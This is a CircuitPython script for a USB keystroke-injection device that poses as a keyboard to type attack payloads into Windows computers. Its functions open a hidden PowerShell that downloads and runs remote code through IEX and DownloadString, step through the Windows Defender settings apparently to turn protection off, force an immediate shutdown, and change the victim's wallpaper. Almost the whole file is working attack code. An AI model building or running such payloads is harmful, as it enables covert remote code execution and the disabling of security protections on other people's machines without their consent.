import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse
import time
import board
import digitalio
import busio
import payload as pay
from random import randint

mouse = Mouse(usb_hid.devices)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)


gui = Keycode.GUI
r = Keycode.R
s = Keycode.S
alt = Keycode.ALT
enter = Keycode.ENTER
tab = Keycode.TAB
f4 = Keycode.F4
right_ar = Keycode.RIGHT_ARROW
left_ar = Keycode.LEFT_ARROW
down_ar = Keycode.DOWN_ARROW
clt = Keycode.LEFT_CONTROL
esc = Keycode.ESCAPE
space = Keycode.SPACE
right_cli = Mouse.RIGHT_BUTTON


# Easy Functions

# -------------------------------------------------------------------------

#One Key Alone if thi function.
def wk(key):
    write_code = keyboard.send(key)
    return write_code

#If there is two keys then this function
def wkt(key1, key2):
    write_code = keyboard.send(key1, key2)
    return write_code

#If there is a string to type then this function
def ws(strin):
    string_key = layout.write(strin)
    return string_key

#Delay Time sleep time
def delay(tim):
    time_sl = time.sleep(tim)
    return time_sl

#Reduce the key reaptting.
def rd(key, hmt, dela):
    for i in range(0, hmt):
        wk(key)
        delay(dela)

#Opens Run Prompt with string(command) and time.
def rp(str_1, tim):
    wkt(gui, r)
    delay(tim)
    ws(str_1)
    delay(tim)
    wk(enter)

#Mouse Key Pressing.
def mc(mkey):
    mkey_1 = mouse.click(mkey)
    return mkey_1

# -------------------------------------------------------------------------

# Payload Functions

# -------------------------------------------------------------------------

#Reverse Shell Payload Functions.
def reverse_shell(data_str):
    delay(0.5)
    wkt(gui, r)
    delay(0.3)
    ws(
        "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('"
        + data_str
        + "');"
    )


#Windows Defender Payload.
def windows_defender():
    wkt(clt, esc)
    delay(0.3)
    ws("windows Defender")
    delay(0.3)
    wk(enter)
    delay(0.8)
    wk(enter)
    delay(0.4)
    rd(tab, 5, 0.3)
    wk(enter)
    delay(0.3)
    wk(space)
    delay(0.5)
    wk(left_ar)
    delay(0.4)
    wk(enter)
    delay(0.5)
    wkt(alt, f4)

#Wallpaper payload and function.
def wallpaper_change(wall_link):
    if len(wall_link) > 1:
        rp("firefox" + " " + wall_link[:-2], 0.2)
        delay(1.5)
        wkt(clt, s)
        delay(0.3)
        ws("hack.jpg")
        delay(0.3)
        wk(enter)
        delay(0.4)
        wkt(gui, r)
        delay(0.4)
        ws("%USERPROFILE%\Downloads/hack.jpg")
        delay(0.2)
        wk(enter)
        delay(1)
        mc(right_cli)
        delay(0.3)
        rd(down_ar, 12, 0.2)
        wk(enter)
        delay(0.2)
        wk(down_ar)
        delay(0.4)
        wk(enter)
        delay(0.2)
        wkt(alt, f4)
    else:
        wkt(gui, r)
        delay(0.3)
        ws(
            "firefox http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg"
        )
        delay(0.3)
        wk(enter)
        delay(1.5)
        wkt(clt, s)
        delay(0.3)
        wk(enter)
        delay(0.4)
        wkt(gui, r)
        delay(0.4)
        ws("%USERPROFILE%\Downloads/01-rubberduck-hongkong.jpg")
        delay(0.2)
        wk(enter)
        delay(0.4)
        mc(right_cli)
        delay(0.3)
        rd(down_ar, 12, 0.2)
        wk(enter)
        delay(0.2)
        wk(down_ar)
        delay(0.4)
        wk(enter)
        delay(0.2)
        wkt(alt, f4)

def shutdown_com():
    rp("cmd", 0.2)
    delay(0.3)
    ws("shutdown /s /t 0")
    wk(enter)

def open_link(str_1):
    rp(str_1, 0.3)
    delay(0.3)

def onotepad_str(str_1):
    rp("notepad", 0.3)
    delay(0.3)
    ws(str_1[:-2])

def types_n(str_1):
    wk(enter)
    ws(str_1[:-3])
